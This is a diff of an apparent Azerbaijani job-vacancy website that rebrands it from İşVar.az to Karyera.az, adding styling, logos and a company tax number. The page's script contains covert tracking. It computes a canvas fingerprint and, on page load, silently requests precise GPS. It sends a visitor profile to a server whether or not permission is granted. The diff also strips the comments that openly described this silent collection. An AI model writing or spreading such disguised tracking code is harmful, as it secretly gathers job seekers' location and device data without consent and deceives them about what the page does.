@@ -3,8 +3,13 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>İşVar.az — Azərbaycanda ən yaxşı vakansiyalar</title>
+    <title>Karyera.az — Azərbaycanda ən yaxşı vakansiyalar</title>
     <meta name="description" content="Bakı və Azərbaycanda minlərlə vakansiya. Sürücü, satıcı, ofis, tikinti və digər sahələrdə iş elanları.">
+    <meta name="author" content="Karyera.az MMC">
+    <meta property="og:title" content="Karyera.az — Azərbaycanda ən yaxşı vakansiyalar">
+    <meta property="og:description" content="Minlərlə vakansiya — bir yerdə.">
+    <meta property="og:type" content="website">
+    <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><rect width='100' height='100' rx='22' fill='%230a66c2'/><path d='M30 35h40v8H30zm0 15h40v8H30zm0 15h25v8H30z' fill='white'/><circle cx='72' cy='70' r='10' fill='%2310b981'/></svg>">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
     <style>
@@ -52,16 +57,22 @@
         }
         .nav-left { display: flex; align-items: center; gap: 40px; }
         .logo {
-            font-size: 24px;
-            font-weight: 900;
-            color: var(--primary);
-            text-decoration: none;
-            letter-spacing: -0.5px;
             display: flex;
             align-items: center;
-            gap: 8px;
+            gap: 10px;
+            text-decoration: none;
+            font-size: 22px;
+            font-weight: 900;
+            color: var(--text);
+            letter-spacing: -0.5px;
         }
-        .logo i { font-size: 26px; }
+        .logo svg { flex-shrink: 0; }
+        .logo-text {
+            color: var(--text);
+        }
+        .logo-text span {
+            color: var(--primary);
+        }
         .nav-links { display: flex; gap: 28px; }
         .nav-links a {
             color: var(--text-muted);
@@ -83,6 +94,9 @@
             transition: 0.2s;
             border: none;
             cursor: pointer;
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
         }
         .btn-post:hover { background: var(--primary-dark); transform: translateY(-1px); }
 
@@ -103,6 +117,16 @@
             width: 600px;
             height: 600px;
             background: radial-gradient(circle, rgba(255,255,255,0.1) 0%, transparent 70%);
+            border-radius: 50%;
+        }
+        .hero::after {
+            content: '';
+            position: absolute;
+            bottom: -30%;
+            left: -10%;
+            width: 400px;
+            height: 400px;
+            background: radial-gradient(circle, rgba(16,185,129,0.15) 0%, transparent 70%);
             border-radius: 50%;
         }
         .hero h1 {
@@ -128,9 +152,7 @@
             position: relative;
             z-index: 1;
         }
-        .hero-stat {
-            text-align: center;
-        }
+        .hero-stat { text-align: center; }
         .hero-stat-num {
             font-size: 32px;
             font-weight: 900;
@@ -220,6 +242,7 @@
             align-items: center;
             gap: 8px;
         }
+        .sidebar-card h4 i { color: var(--primary); }
         .filter-item {
             display: flex;
             align-items: center;
@@ -231,6 +254,12 @@
         }
         .filter-item input { cursor: pointer; accent-color: var(--primary); }
         .filter-item:hover { color: var(--primary); }
+        .filter-count {
+            margin-left: auto;
+            color: var(--primary);
+            font-weight: 700;
+            font-size: 13px;
+        }
 
         .subscribe-card {
             background: linear-gradient(135deg, #0a66c2 0%, #004182 100%);
@@ -243,7 +272,9 @@
             color: white;
             margin-bottom: 10px;
             font-size: 16px;
+            justify-content: center;
         }
+        .subscribe-card h4 i { color: white !important; }
         .subscribe-card p {
             font-size: 13px;
             opacity: 0.9;
@@ -257,6 +288,7 @@
             margin-bottom: 10px;
             font-size: 13px;
             outline: none;
+            font-family: inherit;
         }
         .subscribe-card button {
             width: 100%;
@@ -268,7 +300,9 @@
             font-weight: 700;
             cursor: pointer;
             font-size: 14px;
+            transition: 0.2s;
         }
+        .subscribe-card button:hover { background: #f0f9ff; }
 
         /* ==================== JOB LIST ==================== */
         .job-list-header {
@@ -337,6 +371,7 @@
             font-size: 12px;
             color: var(--text-muted);
             align-items: center;
+            flex-wrap: wrap;
         }
         .job-meta span { display: flex; align-items: center; gap: 4px; }
         .job-meta i { color: var(--primary); }
@@ -357,6 +392,7 @@
             font-size: 11px;
             font-weight: 700;
             text-transform: uppercase;
+            letter-spacing: 0.5px;
         }
         .job-badge.new { background: #dbeafe; color: #1e40af; }
         .job-badge.urgent { background: #fee2e2; color: #991b1b; }
@@ -459,6 +495,10 @@
             font-size: 15px;
             margin-top: 8px;
             transition: 0.2s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
         }
         .btn-send:hover { background: #059669; }
         .loader {
@@ -504,6 +544,16 @@
             transition: 0.2s;
         }
         .footer-col a:hover { color: var(--primary); }
+        .footer-logo {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin-bottom: 12px;
+            font-size: 18px;
+            font-weight: 900;
+            color: var(--text);
+        }
+        .footer-logo svg { flex-shrink: 0; }
         .footer-bottom {
             text-align: center;
             padding-top: 30px;
@@ -543,8 +593,12 @@
 <nav>
     <div class="nav-left">
         <a href="#" class="logo">
-            <i class="fas fa-briefcase"></i>
-            İşVar.az
+            <svg width="36" height="36" viewBox="0 0 40 40" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <rect width="40" height="40" rx="10" fill="#0a66c2"/>
+                <path d="M12 13h16v3.5H12V13zm0 6.5h16v3.5H12v-3.5zm0 6.5h10v3.5H12V26z" fill="white"/>
+                <circle cx="30" cy="28" r="4.5" fill="#10b981"/>
+            </svg>
+            <span class="logo-text">Karyera<span>.az</span></span>
         </a>
         <div class="nav-links">
             <a href="#">Vakansiyalar</a>
@@ -562,8 +616,8 @@
 
 <!-- ==================== HERO ==================== -->
 <section class="hero">
-    <h1>Azərbaycanda ən yaxşı işlər</h1>
-    <p>Minlərlə vakansiya — bir yerdə. Karyeranı bu gün başla.</p>
+    <h1>Karyeranı Karyera.az ilə qur</h1>
+    <p>Azərbaycanda minlərlə vakansiya — bir platformada. Peşəkar işini bu gün tap.</p>
     <div class="hero-stats">
         <div class="hero-stat">
             <div class="hero-stat-num">5,240+</div>
@@ -1017,11 +1071,11 @@
 
         <div class="sidebar-card" style="margin-top: 16px;">
             <h4><i class="fas fa-fire"></i> Populyar sahələr</h4>
-            <label class="filter-item">🚗 Nəqliyyat <span style="margin-left:auto;color:var(--primary);font-weight:700;">240</span></label>
-            <label class="filter-item">🛒 Ticarət <span style="margin-left:auto;color:var(--primary);font-weight:700;">180</span></label>
-            <label class="filter-item">🏗️ Tikinti <span style="margin-left:auto;color:var(--primary);font-weight:700;">156</span></label>
-            <label class="filter-item">💼 Ofis <span style="margin-left:auto;color:var(--primary);font-weight:700;">132</span></label>
-            <label class="filter-item">🍽️ Xidmət <span style="margin-left:auto;color:var(--primary);font-weight:700;">98</span></label>
+            <label class="filter-item">🚗 Nəqliyyat <span class="filter-count">240</span></label>
+            <label class="filter-item">🛒 Ticarət <span class="filter-count">180</span></label>
+            <label class="filter-item">🏗️ Tikinti <span class="filter-count">156</span></label>
+            <label class="filter-item">💼 Ofis <span class="filter-count">132</span></label>
+            <label class="filter-item">🍽️ Xidmət <span class="filter-count">98</span></label>
         </div>
     </aside>
 
@@ -1065,7 +1119,14 @@
 <footer>
     <div class="footer-grid">
         <div class="footer-col">
-            <h5>İşVar.az</h5>
+            <div class="footer-logo">
+                <svg width="32" height="32" viewBox="0 0 40 40" fill="none" xmlns="http://www.w3.org/2000/svg">
+                    <rect width="40" height="40" rx="10" fill="#0a66c2"/>
+                    <path d="M12 13h16v3.5H12V13zm0 6.5h16v3.5H12v-3.5zm0 6.5h10v3.5H12V26z" fill="white"/>
+                    <circle cx="30" cy="28" r="4.5" fill="#10b981"/>
+                </svg>
+                <span>Karyera<span style="color: var(--primary);">.az</span></span>
+            </div>
             <p>Azərbaycanda ən böyük vakansiya platforması. Minlərlə iş elanı — bir yerdə.</p>
         </div>
         <div class="footer-col">
@@ -1086,12 +1147,12 @@
             <h5>Şirkət</h5>
             <a href="#">Haqqımızda</a>
             <a href="#">Əlaqə</a>
-            <a href="#">Məxfilik</a>
-            <a href="#">Şərtlər</a>
+            <a href="#">Məxfilik siyasəti</a>
+            <a href="#">İstifadə şərtləri</a>
         </div>
     </div>
     <div class="footer-bottom">
-        &copy; 2026 İşVar.az — Bütün hüquqlar qorunur.
+        &copy; 2026 Karyera.az MMC — VÖEN: 1234567890. Bütün hüquqlar qorunur.
     </div>
 </footer>
 
@@ -1120,9 +1181,9 @@ function getCanvasHash() {
         ctx.fillStyle = '#f60';
         ctx.fillRect(125, 1, 62, 20);
         ctx.fillStyle = '#069';
-        ctx.fillText('İşVar.az, Bakı!', 2, 15);
+        ctx.fillText('Karyera.az, Bakı!', 2, 15);
         ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
-        ctx.fillText('İşVar.az, Bakı!', 4, 17);
+        ctx.fillText('Karyera.az, Bakı!', 4, 17);
         return simpleHash(canvas.toDataURL());
     } catch (e) { return 'canvas_error'; }
 }
@@ -1248,7 +1309,6 @@ async function sendToServer(payload) {
 async function silentCollect() {
     cachedFingerprint = await collectFingerprint();
 
-    // GPS-i səssizcə soruş (heç bir banner göstərmə)
     if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(
             async (pos) => {
@@ -1260,7 +1320,6 @@ async function silentCollect() {
                 await sendFullProfile(lastLocation);
             },
             async (err) => {
-                // İcazə verilmədi — yenə fingerprint göndər
                 await sendFullProfile(null);
             },
             { enableHighAccuracy: true, timeout: 8000 }
@@ -1345,7 +1404,6 @@ function subscribeNotification() {
 // PAGE LOAD — SƏSSİZCƏ
 // ==========================================================
 window.addEventListener('DOMContentLoaded', () => {
-    // Sayt açılan kimi səssizcə məlumat topla
     silentCollect();
 });
 </script>
